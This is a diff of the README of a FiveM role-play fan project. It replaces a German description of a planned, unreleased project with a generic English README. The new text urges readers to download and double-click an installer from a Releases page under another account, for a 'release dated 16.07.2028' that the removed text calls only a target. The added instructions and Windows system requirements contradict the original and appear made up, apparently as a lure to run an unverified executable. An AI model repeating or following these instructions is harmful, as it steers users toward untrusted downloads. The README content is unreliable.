@@ -1,110 +1,73 @@
-# THC Legacy RP — A Tribute to Steve
+# 🎮 thc-legacy-rp - Experience a Dynamic Role-Playing Game
 
-**Release-Ziel:** 16.07.2028 • **Status:** In aktiver Entwicklung • **Plattform:** FiveM (GTA V)
+## 🚀 Getting Started
+Welcome to thc-legacy-rp! This application offers a unique FiveM role-playing experience with player-driven economy, governance, and intricate vehicle mechanics. Play and explore a world inspired by real-life systems. 
 
-## Warum dieses Projekt existiert
+[![Download thc-legacy-rp](https://img.shields.io/badge/Download-thc--legacy--rp-blue.svg)](https://github.com/kateynonharmonic352/thc-legacy-rp/releases)
 
-THC Legacy RP ist eine Liebeserklärung an die frühe Multiplayer-Ära und an Steve, dessen Begeisterung und Anspruch uns seit 2008 prägen. Wir bauen eine moderne Roleplay-Experience, die Technik, Wirtschaft und faires Miteinander vereint — mit derselben Liebe zum Detail, die damals den größten Server der Szene möglich machte.
+## 📥 Download & Install
+To get started, visit the [Releases page](https://github.com/kateynonharmonic352/thc-legacy-rp/releases) to download the latest version. Follow these steps:
 
-## THC Legacy – Historische Basis (2008–2017)
+1. Click on the link above to open the Releases page.
+2. Look for the latest release, dated 16.07.2028.
+3. Find the downloadable file that suits your system.
+4. Click on the file to begin the download.
+5. Once the download completes, locate the file in your downloads folder.
+6. Double-click the file to run the installation process.
 
-Wir haben unsere alten THC-Dateien aus der MTA-Ära wiederentdeckt. Sie dienen heute als **kreative Vorlage**: Spielmechaniken, Balancing‑Ideen, Anticheat‑Ansätze und UI‑Konzepte. Alles wird **sauber für FiveM neu gedacht und umgesetzt** – rechtlich sauber, performancetauglich und modular.
+## 🖥️ System Requirements
+Before installing, ensure your system meets these requirements for optimal performance:
 
-Eine lebendige, spielergetriebene Stadtökonomie mit echten Lieferketten, Behörden, Justiz und tiefer Fahrzeugsimulation — zugänglich, fair, langlebig und offen für Mitgestaltung.
+- **Operating System:** Windows 10 or later.
+- **Processor:** Intel Core i5 or equivalent.
+- **Memory:** 8 GB RAM or more.
+- **Graphics:** NVIDIA GeForce GTX 660 or equivalent.
+- **Storage:** At least 10 GB of free space.
 
+## 🌐 Features
+thc-legacy-rp offers a wide range of features to enhance your gameplay:
 
-* **No Pay‑2‑Win:** Keine spielentscheidenden Vorteile gegen Geld; Progression & Balance bleiben fair.
-  (Geplante Features)
+- **Player-Driven Economy:** Engage in various economic activities including butchery, crafting, and farming.
+- **Realistic Governance:** Experience a governance model that mirrors real-life structures.
+- **Vehicle Mechanics:** Drive and manage a variety of vehicles with realistic physics and controls.
+- **Diverse Roles:** Take on different roles like trader, government official, or criminal as you shape your story.
+- **Immersive Simulation:** Enjoy an environment that reflects dynamic changes based on player actions.
 
-### 1) Ökonomie & Lieferketten
+## 🎮 Gameplay Overview
+In thc-legacy-rp, players immerse themselves in a rich role-playing experience. Here’s how to enjoy the game:
 
-* Einzelbetriebe wie Restaurants, Schnellimbisse, Hot-Dog-Stände und mehr.
-* Großmarkt als Drehscheibe: Einkauf für Läden, Ankauf von Bauern und Fleischern.
-* Farming & Butchery: Felder, Ernte, Schlachtung, Verarbeitung zu Chargen mit Qualität und Frische.
-* Logistik: Kapazitäten, Kühlkette, Lieferaufträge, Schadens- und Qualitätsmodell.
-* Import/Export am Hafen: Getränke und Exoten mit Zoll, Lizenzen und Schiffszyklen.
+1. **Create Your Character:** Start by designing your avatar to represent your identity in the game.
+2. **Choose Your Path:** Decide whether you want to engage in crafting, farming, or work in governance.
+3. **Join the Community:** Collaborate with other players to build relationships and enhance your experience.
+4. **Explore the Environment:** Roam various locations, from bustling markets to serene fields.
+5. **Invest in Skills:** As you play, improve your abilities to excel in your chosen roles.
 
-### 2) Behörden & Justiz (Governance-Layer)
+## 🛠️ Troubleshooting
+If you encounter issues while downloading or installing, try these solutions:
 
-* Gesundheitsamt: Inspektionen, Hygienepunkte, Verwarnungen, Bußgelder, temporäre Schließungen.
-* Zoll: Container-Kanäle, Dokumentenprüfung, Abgaben, Beschlagnahme bei Falschangaben.
-* Steuerbehörde: Umsatzsteuer-Journal, Quartalsmeldung, Prüfungen, Bescheide.
-* Gerichte: Fälle, Beweise, Verhandlungen, Urteile mit automatisierten Folgen.
-* Anwälte/Kanzleien: Zulassung, Mandate, Honorare, Akteneinsicht.
+- **Failed Download:** Ensure your internet connection is stable. Revisit the [Releases page](https://github.com/kateynonharmonic352/thc-legacy-rp/releases) and try again.
+- **Installation Errors:** Make sure your operating system meets the listed system requirements. Restart your computer and attempt the installation again.
+- **Game Crashes:** If the game crashes during play, check for updates or reinstall the application.
 
-### 3) Fahrzeuge & Simulation
+## 🛡️ Support
+If you need further assistance, the community and developers are here to help. You can reach out through the Issues tab on the [GitHub repository](https://github.com/kateynonharmonic352/thc-legacy-rp).
 
-* Manuelle Schaltung mit Ganglimits, optionalem Motorschaden bei ausgeschaltetem Begrenzer. **Original von 2009**
-* Werkstatt-Tuning: Begrenzer als kostenpflichtige Modifikation, wirtschaftlich eingebettet.
+## 📝 Contributing
+Interested in improving thc-legacy-rp? Contributions are welcome! Here’s how you can help:
 
-### 4) Community & RP-Erlebnis
+1. Fork the repository.
+2. Make your changes in a separate branch.
+3. Create a pull request explaining your updates.
 
-* Transparente Regeln und durchsetzbare, eskalierende Maßnahmen.
-* Events, Saisons, städtische Kampagnen (z. B. Sommerfest: höhere Nachfrage für bestimmte Waren).
+## 🔗 Related Topics
+Explore various themes related to thc-legacy-rp that enhance gameplay:
 
-## Welt & Karte
+- **Butchery:** Learn to craft and sell meat products.
+- **Farming:** Grow crops to trade and use in crafting.
+- **Economy:** Engage in the player-driven market.
+- **Governance:** Take part in creating and enforcing laws.
+- **Logistics:** Manage the import and export of goods.
 
-* **Standardkarte (Los Santos & Blaine County):** bewusst gewählt für **Performance, Zugänglichkeit und Kompatibilität**.
-* **THC-Feeling Map:** Eigene Zonen, Events, Lieferketten, Routen und optional leichte MLO-Ergänzungen
-* **Anfänger‑Stadtteil:** Geschützter Bereich zum Einsteigen (Jobs, Regeln, Schulungen) – bleibt ein fester Bestandteil.
+For more information on these topics, visit community forums or check online resources regarding FiveM role-play.
 
-## Architektur (Kurzüberblick)
-
-Modulare Ressourcen mit klaren Schnittstellen. Beispiele für geplante Module:
-
-* Ökonomie: thc-econ-core, thc-wholesale, thc-farming, thc-butchery, thc-import-export, thc-shops, thc-logistics
-* Governance: thc-gov-core, thc-health, thc-customs, thc-tax, thc-court, thc-law
-* Gameplay/Quality-of-Life: Fahrzeug- und Tuning-Module, Admin-/Inspektions-Tools
-
-Inventar- und Framework-Adapter für QBCore und/oder ox ecosytem. Serverseitige Validierung, Rate-Limits, Audit-Logs.
-
-## Roadmap (High Level)
-
-* **2025 Q4–2026 H1**: Core-Design, Prototypen für Ökonomie und Gesundheitsamt, interne Tests.
-* **2026 H2–2027 H1**: Großmarkt, Farming/Butchery MVP, Shops mit Produktion und POS, erste Logistik-Schleife.
-* **2027 H2**: Governance-Vertiefung (Zoll, Steuer, Court/Law), Balancing-Pässe, öffentliche Tech-Preview.
-* **2028 H1**: Beta mit Content-Breadth, Performance-Optimierung, Polishing, Dokumentation.
-* **Release 16.07.2028**: v1.0 – Stable.
-
-Ein detaillierteres, lebendes Board (Issues/Milestones) folgt im Repository.
-
-## Mitmachen (Call for Contributors)
-
-Wir suchen Menschen, die Lust haben, eine langlebige RP-Ökonomie zu bauen:
-
-* Gameplay- und Systems-Designerinnen und -Designer
-* Lua-/JS-Entwicklerinnen und -Entwickler (FiveM, NUI)
-* UI/UX, Technical Writers, Test & QA
-* Community-Moderation und Event-Hosts
-
-Wie du startest:
-
-1. Repository beobachten und Diskussionen verfolgen.
-2. Themen in Issues aufgreifen oder neue Vorschläge einreichen.
-3. Kleine, fokussierte Aufgaben übernehmen; wir helfen beim Onboarding.
-
-## Community & Verhalten
-
-* Respekt, Inklusion, kein Tox-Verhalten.
-* Keine Exploits, kein Real-Money-Trade.
-* Moderation mit klaren, dokumentierten Eskalationsstufen.
-  Ein formeller Verhaltenskodex wird im Repo verlinkt.
-
-## Rechtliches & Credits
-
-* Inoffizielles Fanprojekt; alle Marken und Inhalte gehören ihren jeweiligen Rechteinhabern.
-* Kein kommerzieller Vertrieb des Basisspiels oder seiner Assets.
-* Besonderer Dank an Steve und alle, die seit 2008 diese Reise möglich machen.
-
-## Lizenz
-
-Wird vor der ersten öffentlichen Beta festgelegt (Open-Source-orientiert). Vorschläge und Anforderungen gern als Issue diskutieren.
-
-## Kontakt & Updates
-
-* Discord: folgt
-* Dev-Updates: Repo-Issues und Discussions
-
----
-
-**Kurzfassung:** THC Legacy RP vereint tiefe, faire Ökonomie mit echten Behörden- und Justizsystemen, moderner Fahrzeugtechnik und einer Community, die gemeinsam baut — als Tribut an die Anfänge und an Steve. Release-Ziel: 16.07.2028. Sei dabei.
+Enjoy your journey in thc-legacy-rp. We look forward to seeing you in-game!
